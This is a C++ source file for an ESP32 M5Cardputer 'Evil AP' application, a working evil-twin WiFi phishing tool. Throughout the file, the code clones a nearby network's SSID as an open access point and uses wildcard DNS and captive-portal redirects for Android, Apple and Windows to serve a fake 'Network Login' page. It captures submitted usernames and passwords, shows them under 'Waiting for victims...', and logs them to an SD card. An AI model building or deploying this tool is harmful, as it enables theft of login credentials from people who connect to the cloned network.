#include "app_evilap.h"
#include "nav.h"
#include "input.h"
#include "config.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SD.h>
#include "esp_wifi.h"

// ── Captive portal pages ────────────────────────────────────────────────────

static const char LOGIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html>
<head><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>WiFi Login</title>
<style>
body{font-family:Arial,sans-serif;background:#1a1a2e;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.4);width:300px;color:#eee}
h2{margin:0 0 6px;text-align:center;color:#4fc3f7}
p{text-align:center;color:#aaa;font-size:13px;margin:0 0 18px}
input{width:100%;padding:11px;margin:5px 0;border:1px solid #333;border-radius:6px;box-sizing:border-box;background:#0f3460;color:#eee;font-size:14px}
input::placeholder{color:#555}
button{width:100%;padding:12px;background:#4fc3f7;color:#000;border:none;border-radius:6px;cursor:pointer;font-size:15px;font-weight:bold;margin-top:8px}
</style></head>
<body><div class='box'>
<h2>&#128274; Network Login</h2>
<p>Sign in to access the internet</p>
<form method='post' action='/login'>
<input type='text' name='user' placeholder='Email or Username' autocomplete='off' required>
<input type='password' name='pass' placeholder='Password' required>
<button type='submit'>Sign In</button>
</form>
</div></body></html>
)rawliteral";

static const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html>
<head><meta name='viewport' content='width=device-width,initial-scale=1'>
<meta http-equiv='refresh' content='4;url=http://google.com'>
<title>Connected</title>
<style>body{font-family:Arial,sans-serif;background:#1a1a2e;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;color:#eee}
.box{background:#16213e;padding:40px;border-radius:12px;text-align:center}
h2{color:#4caf50}p{color:#aaa;font-size:14px}</style></head>
<body><div class='box'><h2>&#10003; Connected</h2>
<p>You are now connected to the network.</p><p>Redirecting...</p>
</div></body></html>
)rawliteral";

// ── Credential storage ──────────────────────────────────────────────────────

static constexpr int MAX_CREDS = 12;
static constexpr int MAX_NETS  = 20;
static constexpr int ROWS_VIS  = 10;

struct Credential {
    char user[48];
    char pass[48];
};

static Credential s_creds[MAX_CREDS];
static volatile int s_credCount = 0;
static volatile int s_credTotal = 0;
static volatile int s_loggedTotal = 0;   // how many have been written to SD
static volatile bool s_credDirty = false;

static char s_ssids[MAX_NETS][33];
static int  s_rssis[MAX_NETS];
static int  s_chans[MAX_NETS];
static int  s_netCount = 0;

static char s_targetSsid[33] = {};
static char s_portalPath[40] = {};

// ── Server objects ──────────────────────────────────────────────────────────

static DNSServer        s_dns;
static AsyncWebServer   s_http(80);
static bool             s_apRunning = false;

static bool findPortalFile() {
    const char* names[] = {
        "/evilap/portal.html",
        "/evilap/portal.htm",
        "/evilap/portal.htlm",
    };
    for (auto& p : names) {
        if (SD.exists(p)) { strncpy(s_portalPath, p, sizeof(s_portalPath) - 1); return true; }
    }
    s_portalPath[0] = '\0';
    return false;
}

// ── Async request handlers ──────────────────────────────────────────────────

static void handleRoot(AsyncWebServerRequest* request) {
    if (s_portalPath[0]) {
        request->send(SD, s_portalPath, "text/html");
        return;
    }
    request->send_P(200, "text/html", LOGIN_HTML);
}

static void handleLogin(AsyncWebServerRequest* request) {
    String user = request->hasParam("user", true) ? request->getParam("user", true)->value() : "";
    String pass = request->hasParam("pass", true) ? request->getParam("pass", true)->value() : "";

    if (user.length() > 0 || pass.length() > 0) {
        int slot = s_credTotal % MAX_CREDS;
        strncpy(s_creds[slot].user, user.c_str(), 47); s_creds[slot].user[47] = '\0';
        strncpy(s_creds[slot].pass, pass.c_str(), 47); s_creds[slot].pass[47] = '\0';
        if (s_credCount < MAX_CREDS) s_credCount++;
        s_credTotal++;
        s_credDirty = true;
        // SD logging happens in main loop to avoid SPI conflicts from async task
    }
    request->send_P(200, "text/html", SUCCESS_HTML);
}

static void handleRedirect(AsyncWebServerRequest* request) {
    request->redirect("http://192.168.4.1/");
}

namespace {

enum class EapState { MENU, SCANNING, NET_LIST, CUSTOM_INPUT, CONFIRM, ACTIVE };

EapState s_state     = EapState::MENU;
bool     s_dirty     = true;
int      s_netSel    = 0;
int      s_netScroll = 0;
int      s_credScroll = 0;
String   s_customSsid = "";

void drawStatusBar(const char* title) {
    auto& d = M5Cardputer.Display;
    d.fillRect(0, 0, SCREEN_W, STATUS_H, C_STATUS_BG);
    d.setFont(&fonts::Font0);
    d.setTextSize(1);
    d.setTextColor(C_STATUS_FG, C_STATUS_BG);
    d.setCursor(2, 3);
    d.print(title);
    drawBatteryWidget(C_STATUS_BG, SCREEN_W - 43);
}

void stopAp() {
    if (!s_apRunning) return;
    s_http.end();
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    s_apRunning = false;
}

void startAp(const char* ssid) {
    stopAp();

    // Check for custom portal on SD
    digitalWrite(LORA_NSS_PIN, HIGH);
    digitalWrite(LORA_RST_PIN, LOW);
    if (SD.begin(SD_CS_PIN, SPI, 25000000)) findPortalFile();
    else s_portalPath[0] = '\0';

    WiFi.setAutoReconnect(false);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(
        IPAddress(192, 168, 4, 1),
        IPAddress(192, 168, 4, 1),
        IPAddress(255, 255, 255, 0)
    );
    WiFi.softAP(ssid, "", 6, false, 4);
    esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);

    // Wait for AP to come up
    uint32_t t = millis();
    while (millis() - t < 500) delay(10);

    // DNS wildcard — all domains resolve to our IP
    s_dns.start(53, "*", IPAddress(192, 168, 4, 1));

    // Routes
    s_http.on("/",                    HTTP_GET,  handleRoot);
    s_http.on("/login",               HTTP_POST, handleLogin);
    s_http.on("/generate_204",        HTTP_GET,  handleRedirect);
    s_http.on("/gen_204",             HTTP_GET,  handleRedirect);
    s_http.on("/redirect",            HTTP_GET,  handleRedirect);
    s_http.on("/hotspot-detect.html", HTTP_GET,  handleRedirect);
    s_http.on("/canonical.html",      HTTP_GET,  handleRedirect);
    s_http.on("/ncsi.txt",            HTTP_GET,  handleRedirect);
    s_http.on("/connecttest.txt",     HTTP_GET,  [](AsyncWebServerRequest* r) {
        // 302 != "Microsoft Connect Test" → Windows shows "Sign in to network"
        r->redirect("http://192.168.4.1/");
    });
    s_http.on("/success.txt",         HTTP_GET,  [](AsyncWebServerRequest* r) {
        r->send(200, "text/plain", "success");
    });
    s_http.on("/wpad.dat",            HTTP_GET,  [](AsyncWebServerRequest* r) { r->send(404); });
    s_http.on("/favicon.ico",         HTTP_GET,  [](AsyncWebServerRequest* r) { r->send(404); });
    s_http.onNotFound(handleRoot);
    s_http.begin();

    s_apRunning  = true;
    s_credCount  = 0;
    s_credTotal  = 0;
    s_loggedTotal = 0;
    s_credDirty  = false;
    s_credScroll = 0;
}

void drawMenu() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Evil AP");
    d.setFont(&fonts::Font0);
    d.setTextSize(1);

    d.fillRoundRect(10, 18, 220, 36, 6, 0x1A0000);
    d.drawRoundRect(10, 18, 220, 36, 6, 0xCC0000);
    d.setTextColor(0xFF5555, 0x1A0000);
    d.setTextSize(2); d.setCursor(20, 24); d.print("SCAN");
    d.setTextSize(1);
    d.setTextColor(C_DIM, 0x1A0000);
    d.setCursor(20, 40); d.print("Clone a nearby WiFi network");

    d.fillRoundRect(10, 60, 220, 36, 6, 0x1A0A00);
    d.drawRoundRect(10, 60, 220, 36, 6, 0xCC5500);
    d.setTextColor(0xFF9944, 0x1A0A00);
    d.setTextSize(2); d.setCursor(20, 66); d.print("CUSTOM");
    d.setTextSize(1);
    d.setTextColor(C_DIM, 0x1A0A00);
    d.setCursor(20, 82); d.print("Enter any SSID manually");

    d.setTextColor(C_DIM, C_BG);
    d.setCursor(2, SCREEN_H - FONT_H - 1);
    d.print("Enter=scan  C=custom  fn+bksp=back");
}

void drawScanning() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Evil AP");
    d.setFont(&fonts::Font0);
    d.setTextSize(2);
    d.setTextColor(C_FG, C_BG);
    const char* msg = "Scanning...";
    d.setCursor((SCREEN_W - (int)strlen(msg) * FONT_W * 2) / 2, 48);
    d.print(msg);
    d.setTextSize(1);
}

void drawNetList() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Evil AP - Select Network");
    d.setFont(&fonts::Font0);
    d.setTextSize(1);

    for (int i = 0; i < ROWS_VIS && (s_netScroll + i) < s_netCount; i++) {
        int idx = s_netScroll + i;
        int y   = STATUS_H + 2 + i * 11;
        bool sel = (idx == s_netSel);
        d.fillRect(0, y, SCREEN_W, 11, sel ? C_HIGHLIGHT : C_BG);

        uint32_t rssiCol = s_rssis[idx] >= -65 ? (uint32_t)0x00CC00
                         : s_rssis[idx] >= -80 ? (uint32_t)0xCCAA00
                                               : (uint32_t)0xFF5555;
        d.setTextColor(rssiCol, sel ? C_HIGHLIGHT : C_BG);
        char rb[5]; snprintf(rb, sizeof(rb), "%4d", s_rssis[idx]);
        d.setCursor(0, y + 2); d.print(rb);

        d.setTextColor(sel ? C_FG : 0xAAAAAA, sel ? C_HIGHLIGHT : C_BG);
        d.setCursor(28, y + 2);
        char nm[30]; snprintf(nm, sizeof(nm), "%-28s", s_ssids[idx]);
        d.print(nm);
    }

    d.fillRect(0, SCREEN_H - FONT_H - 2, SCREEN_W, FONT_H + 2, C_BG);
    d.setTextColor(C_DIM, C_BG);
    char footer[48];
    snprintf(footer, sizeof(footer), "%d found  up/dn  Enter=clone  fn+bksp=back", s_netCount);
    d.setCursor(2, SCREEN_H - FONT_H - 1);
    d.print(footer);
}

void drawCustomInput() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Evil AP - Custom SSID");
    d.setFont(&fonts::Font0);
    d.setTextSize(1);

    d.setTextColor(C_DIM, C_BG);
    d.setCursor(14, 26); d.print("Enter target SSID:");

    d.fillRoundRect(10, 40, 220, 22, 4, 0x111111);
    d.drawRoundRect(10, 40, 220, 22, 4, C_ACCENT);
    d.setTextColor(C_FG, 0x111111);
    d.setCursor(16, 47);
    String display = s_customSsid + "_";
    d.print(display.substring(0, 34));

    d.setTextColor(C_DIM, C_BG);
    d.setCursor(2, SCREEN_H - FONT_H - 1);
    d.print("Enter=start  del=backspace  fn+bksp=back");
}

void drawConfirm() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawStatusBar("Evil AP - Confirm");
    d.setFont(&fonts::Font0);
    d.setTextSize(1);

    d.setTextColor(C_DIM, C_BG);
    d.setCursor(14, 24); d.print("Clone network:");
    d.setTextColor(0xFF5555, C_BG);
    d.setCursor(14, 36); d.print(s_targetSsid);

    digitalWrite(LORA_NSS_PIN, HIGH);
    digitalWrite(LORA_RST_PIN, LOW);
    bool hasCustom = SD.begin(SD_CS_PIN, SPI, 25000000) && findPortalFile();
    if (hasCustom) {
        d.fillRoundRect(10, 52, 220, 20, 4, 0x001A00);
        d.drawRoundRect(10, 52, 220, 20, 4, 0x00AA00);
        d.setTextColor(0x00FF00, 0x001A00);
        d.setCursor(18, 58);
        char pb[36]; snprintf(pb, sizeof(pb), "Portal: %s", s_portalPath + 8);
        d.print(pb);
    } else {
        d.fillRoundRect(10, 52, 220, 20, 4, 0x1A1000);
        d.drawRoundRect(10, 52, 220, 20, 4, 0x886600);
        d.setTextColor(0xFFCC44, 0x1A1000);
        d.setCursor(18, 58); d.print("Portal: built-in default");
    }

    d.fillRoundRect(10, 76, 220, 20, 4, 0x1A0000);
    d.drawRoundRect(10, 76, 220, 20, 4, 0xCC0000);
    d.setTextColor(0xFF8888, 0x1A0000);
    d.setCursor(18, 82); d.print("WiFi drops - reconnect via Settings");

    d.setTextColor(C_DIM, C_BG);
    d.setCursor(2, SCREEN_H - FONT_H - 1);
    d.print("Enter=start  fn+bksp=cancel");
}

void drawActive() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);

    d.fillRect(0, 0, SCREEN_W, STATUS_H, 0x330000);
    d.setFont(&fonts::Font0);
    d.setTextSize(1);
    d.setTextColor(0xFF4444, 0x330000);
    d.setCursor(2, 3);
    char title[36];
    snprintf(title, sizeof(title), "LIVE: %.20s", s_targetSsid);
    d.print(title);

    int clients = WiFi.softAPgetStationNum();
    String apIpStr = WiFi.softAPIP().toString();
    d.setTextColor(C_DIM, C_BG);
    d.setCursor(0, STATUS_H + 2);
    char info[48];
    snprintf(info, sizeof(info), "IP:%s  Cli:%d  Cap:%d",
             apIpStr.c_str(), clients, s_credTotal);
    d.print(info);

    d.drawFastHLine(0, STATUS_H + 12, SCREEN_W, 0x222222);

    int listY = STATUS_H + 14;
    if (s_credCount == 0) {
        d.setTextColor(C_DIM, C_BG);
        d.setCursor(14, listY + 16); d.print("Waiting for victims...");
    } else {
        int maxShow = (SCREEN_H - listY - FONT_H - 4) / 18;
        int start   = s_credTotal - 1;
        for (int i = 0; i < maxShow && i < s_credTotal; i++) {
            int slot = (start - i) % MAX_CREDS;
            if (slot < 0) slot += MAX_CREDS;
            int y = listY + i * 18;
            d.setTextColor(0xFF6666, C_BG);
            d.setCursor(0, y);
            char uline[42]; snprintf(uline, sizeof(uline), "U:%.38s", s_creds[slot].user);
            d.print(uline);
            d.setTextColor(0xFFAA44, C_BG);
            d.setCursor(0, y + 9);
            char pline[42]; snprintf(pline, sizeof(pline), "P:%.38s", s_creds[slot].pass);
            d.print(pline);
        }
    }

    d.fillRect(0, SCREEN_H - FONT_H - 2, SCREEN_W, FONT_H + 2, C_BG);
    d.setTextColor(C_DIM, C_BG);
    d.setCursor(2, SCREEN_H - FONT_H - 1);
    d.print("Tap sign-in notif or http://192.168.4.1");
}

void doWifiScan() {
    drawScanning();
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, false);
    s_netCount = (n > MAX_NETS) ? MAX_NETS : n;
    for (int i = 0; i < s_netCount; i++) {
        strncpy(s_ssids[i], WiFi.SSID(i).c_str(), 32); s_ssids[i][32] = '\0';
        s_rssis[i] = WiFi.RSSI(i);
        s_chans[i] = WiFi.channel(i);
    }
    WiFi.scanDelete();
    s_netSel    = 0;
    s_netScroll = 0;
}

} // namespace

void appEvilApEnter() {
    s_state      = EapState::MENU;
    s_dirty      = true;
    s_customSsid = "";
    stopAp();
}

void appEvilApLoop() {
    // DNS must be serviced in the main loop; async HTTP handles itself
    if (s_apRunning) {
        s_dns.processNextRequest();

        // SD credential logging — done here to avoid SPI conflicts from async task
        if (s_credTotal > s_loggedTotal) {
            int slot = s_loggedTotal % MAX_CREDS;
            s_loggedTotal++;
            digitalWrite(LORA_NSS_PIN, HIGH);
            digitalWrite(LORA_RST_PIN, LOW);
            if (SD.begin(SD_CS_PIN, SPI, 25000000)) {
                if (!SD.exists("/evilap")) SD.mkdir("/evilap");
                File f = SD.open("/evilap/log.txt", FILE_APPEND);
                if (f) {
                    f.printf("[%lu] user=%s  pass=%s\n",
                             (unsigned long)millis(),
                             s_creds[slot].user,
                             s_creds[slot].pass);
                    f.close();
                }
            }
        }
    }

    if (s_state == EapState::ACTIVE && s_credDirty) {
        drawActive();
        s_credDirty = false;
    }

    if (s_dirty) {
        switch (s_state) {
            case EapState::MENU:         drawMenu();        break;
            case EapState::NET_LIST:     drawNetList();     break;
            case EapState::CUSTOM_INPUT: drawCustomInput(); break;
            case EapState::CONFIRM:      drawConfirm();     break;
            case EapState::ACTIVE:       drawActive();      break;
            default: break;
        }
        s_dirty = false;
    }

    auto ev = readKeys();
    if (!ev.changed) return;

    if (ev.back) {
        if (s_state == EapState::ACTIVE) {
            stopAp();
            s_state = EapState::MENU;
        } else if (s_state == EapState::MENU) {
            goHome();
            return;
        } else {
            s_state = EapState::MENU;
        }
        s_dirty = true;
        return;
    }

    switch (s_state) {
        case EapState::MENU: {
            bool doCustom = false;
            if (!ev.fnKey) {
                for (char c : ev.chars) {
                    if (c == 'c' || c == 'C') { doCustom = true; break; }
                }
            }
            if (doCustom) {
                s_customSsid = "";
                s_state = EapState::CUSTOM_INPUT;
                s_dirty = true;
            } else if (ev.enter) {
                doWifiScan();
                s_state = s_netCount > 0 ? EapState::NET_LIST : EapState::MENU;
                s_dirty = true;
                if (s_netCount == 0) {
                    auto& d = M5Cardputer.Display;
                    d.setTextColor(C_DIM, C_BG);
                    d.setCursor(2, SCREEN_H - FONT_H - 1);
                    d.print("No networks found - try again");
                }
            }
            break;
        }

        case EapState::NET_LIST:
            if (ev.up && s_netSel > 0) {
                s_netSel--;
                if (s_netSel < s_netScroll) s_netScroll = s_netSel;
                s_dirty = true;
            }
            if (ev.down && s_netSel < s_netCount - 1) {
                s_netSel++;
                if (s_netSel >= s_netScroll + ROWS_VIS) s_netScroll = s_netSel - ROWS_VIS + 1;
                s_dirty = true;
            }
            if (ev.enter) {
                strncpy(s_targetSsid, s_ssids[s_netSel], 32);
                s_state = EapState::CONFIRM;
                s_dirty = true;
            }
            break;

        case EapState::CUSTOM_INPUT:
            if (ev.del && s_customSsid.length() > 0) {
                s_customSsid.remove(s_customSsid.length() - 1);
                s_dirty = true;
            }
            if (ev.chars.length() > 0 && s_customSsid.length() < 32) {
                for (char c : ev.chars) {
                    if (s_customSsid.length() < 32) s_customSsid += c;
                }
                s_dirty = true;
            }
            if (ev.enter && s_customSsid.length() > 0) {
                strncpy(s_targetSsid, s_customSsid.c_str(), 32);
                s_state = EapState::CONFIRM;
                s_dirty = true;
            }
            break;

        case EapState::CONFIRM:
            if (ev.enter) {
                auto& d = M5Cardputer.Display;
                d.fillScreen(C_BG);
                drawStatusBar("Evil AP");
                d.setFont(&fonts::Font0);
                d.setTextSize(2);
                d.setTextColor(C_FG, C_BG);
                d.setCursor((SCREEN_W - 14 * FONT_W * 2) / 2, 48);
                d.print("Starting AP...");
                d.setTextSize(1);
                startAp(s_targetSsid);
                s_state = EapState::ACTIVE;
                s_dirty = true;
            }
            break;

        case EapState::ACTIVE:
            break;

        default:
            break;
    }
}
